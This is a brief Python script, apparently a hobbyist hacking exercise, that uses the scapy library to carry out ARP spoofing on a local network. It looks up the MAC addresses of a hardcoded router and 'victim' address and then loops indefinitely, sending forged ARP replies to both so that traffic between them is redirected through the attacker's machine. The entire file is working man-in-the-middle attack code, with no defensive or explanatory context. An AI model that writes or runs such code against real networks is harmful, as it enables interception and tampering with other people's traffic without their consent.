#! usr/env/lib python

import scapy.all as scapy
import time
import sys

router_IP = '192.168.1.1'
victim_IP = '192.168.1.156'

counter = 0
pack_count = 0
movement = 1

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    #arp_request.show()
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #broadcast.show()
    arp_request_broadcast = broadcast/arp_request
    #arp_request_broadcast.show()
    answered = scapy.srp(arp_request_broadcast, timeout=15, verbose=False)[0]
    #print(answered.summary())
    return answered[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

while True:
    spoof(victim_IP, router_IP)
    spoof(router_IP, victim_IP)


    print("\rPackets Sent >> " + str(pack_count)),
    sys.stdout.flush()
    pack_count += 2
    time.sleep(2)
